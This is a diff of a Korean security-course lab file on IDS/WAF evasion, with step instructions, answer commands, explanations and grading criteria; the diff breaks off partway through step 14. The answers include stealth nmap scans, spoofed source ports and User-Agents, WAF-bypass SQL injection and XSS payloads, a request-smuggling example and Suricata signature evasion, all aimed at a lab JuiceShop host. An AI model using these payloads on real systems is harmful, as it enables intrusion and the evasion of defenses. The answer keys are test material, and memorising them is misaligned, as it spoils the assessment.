@@ -3,8 +3,7 @@ title: 은닉 기법 (Evasion)
 version: non-ai
 course: attack-nonai
 week: 12
-description: IDS/IPS, WAF, 안티바이러스 등 보안 장비의 탐지를 우회하는 은닉(Evasion) 기법을 실습한다. 패킷 분할, 인코딩,
-  난독화, 타이밍 기법 등을 학습한다.
+description: IDS/IPS, WAF, 안티바이러스 등 보안 장비의 탐지를 우회하는 은닉(Evasion) 기법을 실습한다. 패킷 분할, 인코딩, 난독화, 타이밍 기법 등을 학습한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -20,177 +19,334 @@ steps:
   points: 10
   answer: ssh ccc@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules
     2>/dev/null | head -20' 2>/dev/null
-  answer_detail: IDS/IPS 규칙을 사전에 파악하면 탐지를 우회하는 페이로드를 설계할 수 있다. Suricata는 시그니처 기반 탐지를
-    사용하므로 규칙에 매칭되지 않는 변형 공격은 탐지되지 않는다.
+  answer_detail: IDS/IPS 규칙을 사전에 파악하면 탐지를 우회하는 페이로드를 설계할 수 있다. Suricata는 시그니처 기반 탐지를 사용하므로 규칙에 매칭되지 않는
+    변형 공격은 탐지되지 않는다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
+    semantic:
+      intent: Suricata 룰 확인 — ssh secu 'ls /etc/suricata/rules/; cat /etc/suricata/rules/local.rules'.
+        MITRE T1518.001 Security Software Discovery. 시그니처 기반 탐지 사전 파악 → 변형 페이로드 설계. Emerging Threats ET
+        open 룰셋 구조 이해.
+      success_criteria:
+      - /etc/suricata/rules 경로 읽기
+      - '--- 구분자 + local.rules 내용'
+      - SSH 원격 실행
+      acceptable_methods:
+      - cat local.rules
+      - suricata --list-keywords
+      - suricata-update list-sources
+      negative_signs:
+      - 규칙 파일 경로 없음
+      - 단순 ls (내용 없음)
+      - 시그니처 기반 회피 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를
-    사용하라.
+  instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를 사용하라.
   hint: -T1은 Sneaky 타이밍, -f는 패킷 분할, -D는 디코이이다
   category: exploit
   points: 10
-  answer: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head
-    -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3 random
-    decoys'''
-  answer_detail: -T1(Sneaky)은 패킷 전송 간격을 15초로 늘려 IDS의 시간 기반 탐지를 회피한다. -f는 패킷을 8바이트
-    단위로 분할하여 시그니처 매칭을 방해한다. -D는 디코이 IP를 추가하여 실제 스캐너를 식별하기 어렵게 만든다.
+  answer: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head -20 && echo ''Stealth
+    scan completed with: T1 timing, fragmentation, 3 random decoys'''
+  answer_detail: -T1(Sneaky)은 패킷 전송 간격을 15초로 늘려 IDS의 시간 기반 탐지를 회피한다. -f는 패킷을 8바이트 단위로 분할하여 시그니처 매칭을 방해한다.
+    -D는 디코이 IP를 추가하여 실제 스캐너를 식별하기 어렵게 만든다.
   verify:
     type: output_contains
     expect: Stealth scan
     field: stdout
+    semantic:
+      intent: nmap 스텔스 조합 — sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 target. MITRE T1046 + T1090 Proxy.
+        -T1(Sneaky 15초 간격) + -f(8바이트 분할) + -D RND:3(랜덤 디코이 3개). 시간+분할+디코이 3축 회피.
+      success_criteria:
+      - -T1 + -f + -D 3옵션 조합
+      - Stealth scan 키워드
+      - 3가지 회피 축 설명
+      acceptable_methods:
+      - nmap -T1 -f -D
+      - nmap --scan-delay
+      - masscan --rate 낮춤
+      negative_signs:
+      - 옵션 1개 이하
+      - 스텔스 맥락 없음
+      - 디코이 없음
   target_vm: attacker
 - order: 3
   instruction: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형하라. 대소문자 혼합, 주석 삽입, 인코딩 등을 적용하라.
   hint: UNION SELECT를 uNiOn SeLeCt, UN/**/ION SE/**/LECT 등으로 변형한다
   category: exploit
   points: 10
-  answer: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
-    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
-    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
-    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
-    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
+  answer: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn SeLeCt'' && echo ''2.
+    Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54''
+    && echo ''4. Double URL encoding: %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT''
+    && echo ''6. Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
     | head -c 200'
-  answer_detail: WAF는 보통 정규표현식으로 공격 패턴을 탐지한다. 대소문자 혼합, SQL 주석(/**/)을 이용한 키워드 분할, URL
-    이중 인코딩 등으로 정규표현식 매칭을 우회할 수 있다.
+  answer_detail: WAF는 보통 정규표현식으로 공격 패턴을 탐지한다. 대소문자 혼합, SQL 주석(/**/)을 이용한 키워드 분할, URL 이중 인코딩 등으로 정규표현식
+    매칭을 우회할 수 있다.
   verify:
     type: output_contains
     expect: SQLi Evasion
     field: stdout
+    semantic:
+      intent: SQLi WAF 우회 페이로드 — 대소문자 혼합(uNiOn SeLeCt) + 주석(/**/) + URL 인코딩 + 이중 인코딩(%2555) + null byte(%00)
+        + 탭/개행(%09/%0a). OWASP WAF Bypass Cheatsheet. 정규표현식 기반 시그니처 회피.
+      success_criteria:
+      - SQLi Evasion 키워드
+      - 변형 기법 4개 이상 (case/주석/인코딩/이중)
+      - 실 페이로드 URL 테스트
+      acceptable_methods:
+      - 대소문자+주석+인코딩 혼합
+      - sqlmap --tamper
+      - Burp Intruder payload processing
+      negative_signs:
+      - 변형 2개 이하
+      - 정규식 회피 맥락 없음
+      - 실 요청 없음
   target_vm: attacker
 - order: 4
   instruction: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연하라.
   hint: 이벤트 핸들러(onerror, onload), SVG, img 태그 등을 활용한다
   category: exploit
   points: 10
-  answer: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img
-    src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3.
-    Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
-    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
+  answer: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img src=x onerror=alert(1)>''
+    && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3. Body: <body onload=alert(1)>'' && echo ''4.
+    Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>'' && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
     && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
     | head -c 200'
-  answer_detail: WAF가 <script> 태그를 차단해도 HTML 이벤트 핸들러(onerror, onload, onfocus), SVG
-    태그, data URI 등 다양한 경로로 JavaScript를 실행할 수 있다. WAF 우회는 끊임없는 공격-방어 경쟁이다.
+  answer_detail: WAF가 <script> 태그를 차단해도 HTML 이벤트 핸들러(onerror, onload, onfocus), SVG 태그, data URI 등 다양한
+    경로로 JavaScript를 실행할 수 있다. WAF 우회는 끊임없는 공격-방어 경쟁이다.
   verify:
     type: output_contains
     expect: XSS Evasion
     field: stdout
+    semantic:
+      intent: XSS WAF 우회 — img onerror / svg onload / body onload / data URI / template literal ${alert(1)}
+        / hex escape \x61. OWASP XSS Filter Evasion Cheatsheet. <script> 차단 시 이벤트 핸들러/SVG/data URI 대체.
+      success_criteria:
+      - XSS Evasion 키워드
+      - 변형 페이로드 4개 이상
+      - 실제 URL 인코딩 테스트
+      acceptable_methods:
+      - onerror/onload/onfocus 핸들러
+      - SVG + data URI
+      - XSS polyglot (0xsp/PayloadsAllTheThings)
+      negative_signs:
+      - <script>만 사용
+      - 이벤트 핸들러 없음
+      - 4개 미만
   target_vm: attacker
 - order: 5
   instruction: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회하라.
   hint: --source-port 또는 -g 옵션으로 소스 포트를 지정한다
   category: exploit
   points: 10
-  answer: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source
-    port 53 (DNS) often allowed through firewalls'
-  answer_detail: 일부 방화벽은 DNS(53), HTTP(80) 소스 포트에서 오는 패킷을 허용한다. nmap의 -g 옵션으로 소스 포트를
-    위장하면 이러한 규칙을 우회할 수 있다.
+  answer: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source port 53 (DNS) often
+    allowed through firewalls'
+  answer_detail: 일부 방화벽은 DNS(53), HTTP(80) 소스 포트에서 오는 패킷을 허용한다. nmap의 -g 옵션으로 소스 포트를 위장하면 이러한 규칙을 우회할
+    수 있다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
+    semantic:
+      intent: 소스 포트 위장 — sudo nmap -sS -g 53 -p 22,80,3000 target. MITRE T1036 Masquerading. 일부 방화벽이 DNS(53)/HTTP(80)
+        소스 포트 허용 → stateless 방화벽 우회. -g 또는 --source-port.
+      success_criteria:
+      - -g 53 또는 --source-port
+      - DNS/HTTP 소스 포트 맥락
+      - '--- 구분자 + 설명'
+      acceptable_methods:
+      - nmap -g 53
+      - hping3 --baseport
+      - scapy sport=53
+      negative_signs:
+      - -g 없음
+      - 소스 포트 변경 없음
+      - 방화벽 우회 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를 사용하라.
   hint: 'curl -H ''User-Agent: ...'' 옵션으로 헤더를 변경한다'
   category: exploit
   points: 10
-  answer: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null
-    | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent:
-    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
-    Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null | grep -i
-    server && echo ''---'' && echo ''WAFs often block known scanner User-Agents (Nikto,
-    sqlmap, Nmap)'''
-  answer_detail: WAF와 IDS는 알려진 공격 도구(Nikto, sqlmap, Nmap Scripting Engine)의 User-Agent를
-    시그니처로 탐지한다. 정상 브라우저 UA로 위장하면 이러한 기본 탐지를 우회할 수 있다.
+  answer: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null | grep -i server
+    && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
+    x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000
+    2>/dev/null | grep -i server && echo ''---'' && echo ''WAFs often block known scanner User-Agents
+    (Nikto, sqlmap, Nmap)'''
+  answer_detail: WAF와 IDS는 알려진 공격 도구(Nikto, sqlmap, Nmap Scripting Engine)의 User-Agent를 시그니처로 탐지한다. 정상
+    브라우저 UA로 위장하면 이러한 기본 탐지를 우회할 수 있다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
+    semantic:
+      intent: 'User-Agent 위장 — curl -H ''User-Agent: Mozilla/5.0 ... Chrome/120'' target. MITRE T1036
+        + T1070 Indicator Removal. WAF가 Nikto/sqlmap/NmapScriptingEngine UA 시그니처로 탐지 → 정상 브라우저 UA 위장.'
+      success_criteria:
+      - curl -H User-Agent 위장
+      - 기본 vs 위장 UA 비교
+      - 알려진 스캐너 UA 언급
+      acceptable_methods:
+      - curl -H User-Agent
+      - nikto -useragent
+      - sqlmap --random-agent
+      negative_signs:
+      - UA 위장 없음
+      - 비교 없음
+      - WAF 도구 탐지 맥락 없음
   target_vm: attacker
 - order: 7
   instruction: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송하라.
   hint: hping3 -f 옵션으로 패킷을 분할한다
   category: exploit
   points: 10
-  answer: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---'
-    && echo 'IP fragmentation splits payload across multiple packets' && echo 'IDS
-    must reassemble fragments to detect signatures' && echo 'Some IDS fail to reassemble
-    overlapping or out-of-order fragments'
-  answer_detail: IP 분할은 패킷을 여러 조각으로 나누어 IDS의 시그니처 매칭을 방해한다. IDS가 모든 프래그먼트를 올바르게 재조립하지
-    못하면 공격 페이로드를 탐지할 수 없다.
+  answer: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---' && echo 'IP fragmentation
+    splits payload across multiple packets' && echo 'IDS must reassemble fragments to detect signatures'
+    && echo 'Some IDS fail to reassemble overlapping or out-of-order fragments'
+  answer_detail: IP 분할은 패킷을 여러 조각으로 나누어 IDS의 시그니처 매칭을 방해한다. IDS가 모든 프래그먼트를 올바르게 재조립하지 못하면 공격 페이로드를 탐지할
+    수 없다.
   verify:
     type: output_contains
     expect: fragmentation
     field: stdout
+    semantic:
+      intent: IP 분할 — sudo hping3 -S -p 3000 -f -c 3 target. MITRE T1090. -f IP 프래그먼테이션 → IDS 시그니처 매칭
+        방해. IDS가 재조립 실패하면 페이로드 탐지 불가. 오버랩/순서뒤집기 변형 가능.
+      success_criteria:
+      - hping3 -f 분할 옵션
+      - fragmentation 키워드
+      - IDS 재조립 한계 설명
+      acceptable_methods:
+      - hping3 -f
+      - nmap -f / --mtu
+      - scapy fragment()
+      negative_signs:
+      - 분할 옵션 없음
+      - 재조립 맥락 없음
+      - 단일 패킷
   target_vm: attacker
 - order: 8
-  instruction: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
-    헤더를 조작하라.
+  instruction: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding 헤더를 조작하라.
   hint: CL과 TE 헤더를 동시에 사용하여 불일치를 만든다
   category: exploit
   points: 10
-  answer: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo
-    ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
-    chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
-    ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo
-    ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
+  answer: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo ''POST / HTTP/1.1''
+    && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' && echo ''0'' &&
+    echo '''' && echo ''SMUGGLED'' && echo ''---'' && echo ''When front-end (WAF) uses CL and back-end
+    uses TE,'' && echo ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
     bypasses WAF inspection entirely'''
-  answer_detail: HTTP Request Smuggling은 프론트엔드(WAF/로드밸런서)와 백엔드 서버의 HTTP 파싱 차이를 악용한다.
-    CL과 TE 헤더가 동시에 존재할 때 각 서버가 다르게 해석하면 WAF를 완전히 우회하는 요청을 삽입할 수 있다.
+  answer_detail: HTTP Request Smuggling은 프론트엔드(WAF/로드밸런서)와 백엔드 서버의 HTTP 파싱 차이를 악용한다. CL과 TE 헤더가 동시에 존재할
+    때 각 서버가 다르게 해석하면 WAF를 완전히 우회하는 요청을 삽입할 수 있다.
   verify:
     type: output_contains
     expect: Request Smuggling
     field: stdout
+    semantic:
+      intent: 'HTTP Request Smuggling — CL-TE: Content-Length + Transfer-Encoding chunked 헤더 동시 사용. CWE-444
+        Inconsistent Interpretation of HTTP Requests. PortSwigger 2019 James Kettle 발견. WAF/백엔드 파싱 차이
+        악용 → WAF 완전 우회.'
+      success_criteria:
+      - Request Smuggling 키워드
+      - CL-TE 또는 TE-CL 시나리오
+      - 프론트/백엔드 파싱 차이 설명
+      acceptable_methods:
+      - CL-TE / TE-CL / TE-TE
+      - Burp Smuggler 확장
+      - h2c 스머글링 (HTTP/2)
+      negative_signs:
+      - 스머글링 원리 없음
+      - 파싱 차이 없음
+      - 헤더 조합 없음
   target_vm: attacker
 - order: 9
   instruction: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석하라.
   hint: secu 서버의 /var/log/suricata/fast.log를 확인한다
   category: analysis
   points: 10
-  answer: ssh ccc@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo
-    "No alerts found"' 2>/dev/null
-  answer_detail: Suricata의 fast.log에는 탐지된 이벤트의 시간, 소스/목적지 IP, 규칙 ID, 메시지가 기록된다. 어떤
-    공격이 탐지되었는지 분석하면 은닉 기법의 효과를 평가할 수 있다.
+  answer: ssh ccc@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo "No alerts found"'
+    2>/dev/null
+  answer_detail: Suricata의 fast.log에는 탐지된 이벤트의 시간, 소스/목적지 IP, 규칙 ID, 메시지가 기록된다. 어떤 공격이 탐지되었는지 분석하면 은닉
+    기법의 효과를 평가할 수 있다.
   verify:
     type: output_contains
     expect: alert
     field: stdout
+    semantic:
+      intent: Suricata fast.log 분석 — ssh secu 'tail -30 /var/log/suricata/fast.log'. NIST SP 800-94 IDS.
+        시간/소스/목적지/sid/메시지 기록. 어떤 공격이 탐지되었는지 분석 → 은닉 기법 효과 평가.
+      success_criteria:
+      - fast.log 경로 읽기
+      - alert 키워드 출력
+      - secu 원격 SSH
+      acceptable_methods:
+      - tail fast.log
+      - jq eve.json
+      - Wazuh decoder
+      negative_signs:
+      - 로그 경로 없음
+      - tail/cat 없음
+      - 분석 맥락 없음
   target_vm: attacker
 - order: 10
   instruction: 타이밍 기반 은닉을 시연하라. 요청 간 랜덤 지연을 추가하여 IDS의 시간 기반 상관 분석을 우회하라.
   hint: sleep 명령에 랜덤 값을 사용한다
   category: exploit
   points: 10
-  answer: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s";
-    curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products;
-    echo; sleep $DELAY; done && echo ''---'' && echo ''Random delays break IDS time-correlation
-    patterns'''
-  answer_detail: IDS/IPS는 일정한 간격의 반복 요청을 스캔이나 브루트포스로 탐지한다. 랜덤 지연을 추가하면 패턴이 사라져 시간
-    기반 탐지를 우회할 수 있다. 실전에서는 수 초~수 분의 변동을 적용한다.
+  answer: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s"; curl -s -o
+    /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products; echo; sleep $DELAY; done
+    && echo ''---'' && echo ''Random delays break IDS time-correlation patterns'''
+  answer_detail: IDS/IPS는 일정한 간격의 반복 요청을 스캔이나 브루트포스로 탐지한다. 랜덤 지연을 추가하면 패턴이 사라져 시간 기반 탐지를 우회할 수 있다. 실전에서는
+    수 초~수 분의 변동을 적용한다.
   verify:
     type: output_contains
     expect: Random delays
     field: stdout
+    semantic:
+      intent: 랜덤 지연 타이밍 회피 — for 루프 + DELAY=$((RANDOM % 3 + 1)) + sleep. MITRE T1029 Scheduled Transfer
+        + T1497 Virtualization/Sandbox Evasion. IDS의 시간 기반 상관 분석(일정 간격 반복) 패턴 파괴.
+      success_criteria:
+      - Random delays 키워드
+      - RANDOM + sleep 랜덤화
+      - for 루프 반복 요청
+      acceptable_methods:
+      - bash $RANDOM + sleep
+      - python random.uniform() + time.sleep()
+      - Burp Intruder throttle
+      negative_signs:
+      - 랜덤 지연 없음
+      - 고정 sleep만
+      - 시간 상관 분석 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고 접근을
-    시도하라.
+  instruction: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고 접근을 시도하라.
   hint: ip -6 addr 명령으로 IPv6 주소를 확인한다
   category: exploit
   points: 10
-  answer: 'ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null && echo
-    ''---'' && echo ''IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic''
-    && echo ''If dual-stack is enabled, IPv6 traffic may bypass security controls'''
-  answer_detail: 많은 보안 장비가 IPv4 트래픽만 검사하고 IPv6를 무시한다. 듀얼 스택 환경에서 IPv6로 통신하면 방화벽/IDS를
-    완전히 우회할 수 있다. IPv6 보안 정책을 IPv4와 동일하게 적용해야 한다.
+  answer: 'ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null && echo ''---'' && echo ''IPv6
+    evasion: many IDS/firewalls only inspect IPv4 traffic'' && echo ''If dual-stack is enabled, IPv6 traffic
+    may bypass security controls'''
+  answer_detail: 많은 보안 장비가 IPv4 트래픽만 검사하고 IPv6를 무시한다. 듀얼 스택 환경에서 IPv6로 통신하면 방화벽/IDS를 완전히 우회할 수 있다. IPv6
+    보안 정책을 IPv4와 동일하게 적용해야 한다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
+    semantic:
+      intent: IPv6 회피 — ssh web 'ip -6 addr show'. NIST SP 800-119 IPv6 보안. 듀얼 스택 환경에서 IPv6만 검사 누락 → IDS/방화벽
+        정책이 IPv4만 커버 시 우회. IPv6 정책 동일 적용 필수.
+      success_criteria:
+      - ip -6 addr 실행
+      - IPv6 evasion 맥락 설명
+      - 듀얼 스택 우회 언급
+      acceptable_methods:
+      - ip -6 addr
+      - ifconfig | grep inet6
+      - nmap -6 스캔
+      negative_signs:
+      - IPv4만 사용
+      - 듀얼 스택 맥락 없음
+      - 정책 갭 설명 없음
   target_vm: attacker
 - order: 12
   instruction: JuiceShop에 대한 SQL Injection을 WAF가 차단할 경우를 대비한 대체 페이로드를 3개 이상 작성하라.
@@ -199,75 +355,131 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--"
-    "''%20oR%20''1''%3D''1''--" "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--";
-    do echo -n "Payload: $payload -> "; curl -s -o /dev/null -w ''HTTP %{http_code}''
-    -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
-    -d "{\"email\":\"$payload\",\"password\":\"a\"}"; echo; done'
-  answer_detail: 동일한 SQL Injection 결과를 달성하는 페이로드는 무수히 많다. OR 1=1, OR true, || 1=1,
-    OR '1'='1' 등 문법적으로 동일하지만 시그니처가 다른 변형을 사용하면 WAF를 우회할 수 있다.
+    📎 참고 (CLI): echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--" "''%20oR%20''1''%3D''1''--"
+    "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--"; do echo -n "Payload: $payload -> ";
+    curl -s -o /dev/null -w ''HTTP %{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d "{\"email\":\"$payload\",\"password\":\"a\"}"; echo; done'
+  answer_detail: 동일한 SQL Injection 결과를 달성하는 페이로드는 무수히 많다. OR 1=1, OR true, || 1=1, OR '1'='1' 등 문법적으로
+    동일하지만 시그니처가 다른 변형을 사용하면 WAF를 우회할 수 있다.
   verify:
     type: output_contains
     expect: WAF Bypass SQLi
     field: stdout
+    semantic:
+      intent: WAF 우회 SQLi 대체 페이로드 — for payload in OR 1=1 / oR '1'='1' / OR true / +OR+ / || 1=1 do curl
+        POST /rest/user/login. OWASP A03 Injection. 동일 결과 다른 시그니처 변형 5개 이상.
+      success_criteria:
+      - WAF Bypass SQLi 키워드
+      - 변형 페이로드 3개 이상 (OR/||/true)
+      - 응답 코드 비교
+      acceptable_methods:
+      - OR/||/true 변형
+      - sqlmap --tamper=between/space2comment
+      - wfuzz -z file
+      negative_signs:
+      - 페이로드 1개
+      - 변형 없음
+      - 응답 비교 없음
   target_vm: attacker
 - order: 13
   instruction: Suricata 규칙을 분석하여 탐지를 우회하는 페이로드를 설계하는 방법을 설명하라.
   hint: 규칙의 content 매칭 키워드를 분석하여 변형한다
   category: analysis
   points: 10
-  answer: 'echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:'' && echo
-    ''alert http any any -> any any (msg:"SQL Injection"; content:"UNION"; nocase;
-    content:"SELECT"; nocase; sid:1000001;)'' && echo '''' && echo ''Evasion strategies:''
-    && echo ''1. Split keywords: UNI/**/ON SEL/**/ECT (breaks content match)'' &&
-    echo ''2. URL encoding: %55NION %53ELECT'' && echo ''3. Alternative syntax: UNION
+  answer: 'echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:'' && echo ''alert http any
+    any -> any any (msg:"SQL Injection"; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000001;)''
+    && echo '''' && echo ''Evasion strategies:'' && echo ''1. Split keywords: UNI/**/ON SEL/**/ECT (breaks
+    content match)'' && echo ''2. URL encoding: %55NION %53ELECT'' && echo ''3. Alternative syntax: UNION
     ALL SELECT'' && echo ''4. Double encoding: %2555NION'' && echo ''5. Unicode: \u0055NION'''
-  answer_detail: Suricata 규칙의 content 키워드는 패킷 페이로드에서 특정 문자열을 검색한다. 키워드를 분할, 인코딩, 대체
-    문법으로 변형하면 content 매칭을 우회할 수 있다. 그러나 PCRE 기반 규칙은 우회가 더 어렵다.
+  answer_detail: Suricata 규칙의 content 키워드는 패킷 페이로드에서 특정 문자열을 검색한다. 키워드를 분할, 인코딩, 대체 문법으로 변형하면 content
+    매칭을 우회할 수 있다. 그러나 PCRE 기반 규칙은 우회가 더 어렵다.
   verify:
     type: output_contains
     expect: Suricata Rule Analysis
     field: stdout
+    semantic:
+      intent: Suricata 룰 기반 회피 설계 — content:UNION; content:SELECT; 분석 후 UNI/**/ON / %55NION / UNION ALL
+        SELECT / %2555NION / \u0055NION 변형. Suricata content 매칭 원리 → 분할/인코딩/대체 문법 회피. PCRE는 더 어려움.
+      success_criteria:
+      - Suricata Rule Analysis 키워드
+      - content 매칭 분석
+      - 회피 전략 4개 이상
+      acceptable_methods:
+      - content 키워드 분석
+      - PCRE 우회 설계
+      - suricata-update + 룰 검증
+      negative_signs:
+      - 룰 분석 없음
+      - 회피 전략 2개 이하
+      - content 키워드 맥락 없음
   target_vm: attacker
 - order: 14
   instruction: 공격 도구의 네트워크 시그니처를 변경하는 방법을 시연하라. nmap의 데이터 길이를 랜덤으로 패딩하라.
   hint: --data-length 옵션으로 패킷에 랜덤 데이터를 추가한다
   category: exploit
   points: 15
-  answer: 'sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000
-    10.20.30.80 && echo ''---'' && echo ''Anti-fingerprinting options:'' && echo ''--data-length:
-    adds random padding to avoid signature detection'' && echo ''--randomize-hosts:
-    randomizes target order in multi-host scans'' && echo ''--scan-delay: adds delay
-    between probes'' && echo ''--badsum: sends packets with invalid checksums (tests
-    IDS response)'''
-  answer_detail: 보안 장비는 도구의 고유한 패킷 크기, 순서, 타이밍 패턴을 시그니처로 등록한다. --data-length로 패딩을
-    추가하면 패킷 크기 시그니처를 무효화할 수 있다.
+  answer: 'sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000 10.20.30.80 &&
+    echo ''---'' && echo ''Anti-fingerprinting options:'' && echo ''--data-length: adds random padding
+    to avoid signature detection'' && echo ''--randomize-hosts: randomizes target order in multi-host
+    scans'' && echo ''--scan-delay: adds delay between probes'' && echo ''--badsum: sends packets with
+    invalid checksums (tests IDS response)'''
+  answer_detail: 보안 장비는 도구의 고유한 패킷 크기, 순서, 타이밍 패턴을 시그니처로 등록한다. --data-length로 패딩을 추가하면 패킷 크기 시그니처를 무효화할
+    수 있다.
   verify:
     type: output_contains
     expect: Anti-fingerprinting
     field: stdout
+    semantic:
+      intent: nmap 안티 핑거프린팅 — sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 target.
+        MITRE T1027 Obfuscated Files + T1070. --data-length 랜덤 패딩 + --randomize-hosts + --badsum. 패킷 크기/순서
+        시그니처 무효화.
+      success_criteria:
+      - Anti-fingerprinting 키워드
+      - --data-length 또는 --randomize
+      - 옵션 2개 이상 설명
+      acceptable_methods:
+      - nmap --data-length
+      - nmap --scan-delay + --badsum
+      - hping3 --rand-source
